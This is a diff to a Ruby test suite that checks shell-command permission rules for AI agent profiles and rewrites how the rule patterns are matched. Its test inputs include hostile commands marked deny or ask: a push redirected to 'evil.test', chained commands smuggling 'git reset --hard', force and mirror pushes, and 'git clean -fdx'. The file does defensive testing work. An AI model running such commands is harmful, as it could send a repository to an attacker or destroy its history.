@@ -198,10 +198,20 @@ class KosSkillsTest < ActiveSupport::TestCase
       assert_equal "deny", effective_bash_permission(profile, "bash -lc 'git push origin HEAD:main'"), name
     end
 
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      "git commit -F /tmp/kos-message")
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      "git push origin HEAD:refs/heads/main")
+    diagnosed = {
+      "git commit -F *" => "allow", "git commit -F * *" => "deny",
+      "git push origin HEAD:refs/heads/*" => "allow", "git push origin HEAD:refs/heads/* *" => "deny"
+    }
+    assert_equal "deny", effective_bash_permission(diagnosed, "git commit -F /tmp/kos-message")
+    assert_equal "deny", effective_bash_permission(diagnosed, "git push origin HEAD:refs/heads/main")
+
+    publish = agents.fetch("kos-publish")
+    assert_equal "allow", effective_bash_permission(publish, "git commit -F /tmp/kos-message")
+    assert_equal "allow", effective_bash_permission(publish, "git push origin HEAD:refs/heads/main")
+    assert_equal "allow", effective_bash_permission(publish, "git checkout --merge --detach origin/main")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F")
+    assert_equal "deny", effective_bash_permission(publish, "git push origin HEAD:refs/heads/")
+    assert_equal "deny", effective_bash_permission(publish, "git checkout --merge --detach")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
       "git push --force origin HEAD:main")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
@@ -209,26 +219,27 @@ class KosSkillsTest < ActiveSupport::TestCase
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --delete origin main")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git push --mirror origin")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git commit --amend -m replacement")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
-      "git commit -F /tmp/kos-message --all")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
-      "git commit -F /tmp/kos-message -- path/to/file")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message --all")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message -- path/to/file")
+    assert_equal "deny", effective_bash_permission(publish,
       "git push origin HEAD:refs/heads/main :refs/heads/other")
     assert_equal "ask", effective_bash_permission(agents.fetch("kos-publish"),
       "git -c remote.origin.pushurl=ssh://git@evil.test/x/y push origin HEAD:refs/heads/main")
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      "git push origin HEAD:refs/heads/release+hotfix")
+    assert_equal "allow", effective_bash_permission(publish, "git push origin HEAD:refs/heads/release+hotfix")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git reset --hard origin/main")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git clean -fdx")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "git worktree remove /tmp/work")
-    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
-      "git checkout --merge --detach origin/main")
-    assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"),
-      "git checkout --merge --detach origin/main; git reset --hard HEAD")
+    assert_equal "deny", effective_bash_permission(publish,
+      "git checkout --merge --detach origin/main origin/other")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message; git reset --hard HEAD")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message && git status")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message || git status")
+    assert_equal "deny", effective_bash_permission(publish, "git commit -F /tmp/kos-message | git status")
     assert_equal "deny", effective_bash_permission(agents.fetch("kos-publish"), "/usr/bin/curl https://example.test")
     assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
       '"$KOS_CLI_PATH" task materialize-children 1 --definition-file graph.json')
+    assert_equal "allow", effective_bash_permission(agents.fetch("kos-publish"),
+      '"$KOS_CLI_PATH" task report-attempt 1 --artifact-file -')
     assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "this profile alone may"
     assert_includes File.read(AGENT_PATHS.fetch("kos-publish")), "immutable\npre-verification snapshot"
     assert_includes File.read(AGENT_PATHS.fetch("kos-implement")), "every required\ntest, lint, formatting, build, and type check"
@@ -280,9 +291,20 @@ class KosSkillsTest < ActiveSupport::TestCase
 
   def effective_bash_permission(profile, command)
     result = nil
-    profile.dig("permission", "bash").each do |pattern, action|
-      result = action if File.fnmatch?(pattern, command)
+    permissions = profile.dig("permission", "bash") || profile
+    permissions.each do |pattern, action|
+      result = action if opencode_command_match?(pattern, command)
     end
     result
+  end
+
+  def opencode_command_match?(pattern, command)
+    escaped = pattern.tr("\\", "/")
+      .gsub(/[\\.+^${}()|\[\]]/) { |character| "\\#{character}" }
+      .gsub("*", ".*")
+      .gsub("?", ".")
+    escaped = "#{escaped.delete_suffix(" .*")}( .*)?" if escaped.end_with?(" .*")
+
+    Regexp.new("\\A#{escaped}\\z", Regexp::MULTILINE).match?(command.tr("\\", "/"))
   end
 end
